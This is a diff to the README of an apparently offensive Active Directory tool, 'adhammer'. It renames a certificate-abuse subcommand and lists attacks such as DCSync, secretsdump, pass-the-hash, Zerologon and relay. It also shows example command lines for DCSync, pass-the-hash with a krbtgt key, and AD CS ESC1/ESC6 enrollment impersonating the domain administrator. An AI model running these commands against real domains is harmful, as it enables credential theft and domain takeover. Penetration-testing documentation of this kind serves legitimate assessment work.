@@ -341,7 +341,7 @@ auto                                         guided: scan -> confirm each weakne
 enum   {samr, lsa, net, dns, adcs, esc, posture, sessions}
                                             RPC / net / ADIDNS / AD-CS / ESC-registry / DC-posture / SRVSVC
 attack {roast, spray, abuse, coerce, rbcd, constrained, unconstrained, dcsync, exec, atexec, wmiexec,
-        secretsdump, gmsa, laps, esc1, esc4, certipy, golden, silver, pth, asktgt, winrm, capture,
+        secretsdump, gmsa, laps, esc1, esc4, icpr-esc1, golden, silver, pth, asktgt, winrm, capture,
         poison, relay, zerologon, shadowcred, dcshadow, badsuccessor}
 ```
 
@@ -362,8 +362,8 @@ adhammer attack dcsync --host dc --domain CORP --user Administrator --password .
 adhammer attack pth    --host dc --realm CORP.LOCAL --krbtgt-aes256 <64-hex> --domain-sid S-1-5-21-... \
                        --spn cifs/dc.corp.local --command whoami
 
-# AD CS ESC1 / ESC3 / ESC6 / ESC15 enrollment through a unified certipy flow:
-adhammer attack certipy --ca CORP-CA --template User --target-upn administrator@corp.local \
+# AD CS ESC1 / ESC3 / ESC6 / ESC15 enrollment via MS-ICPR:
+adhammer attack icpr-esc1 --ca CORP-CA --template User --target-upn administrator@corp.local \
                         --host dc --domain CORP --user 'CORP\svc' --password ... \
                         --esc esc6 --san-upn administrator@corp.local
 
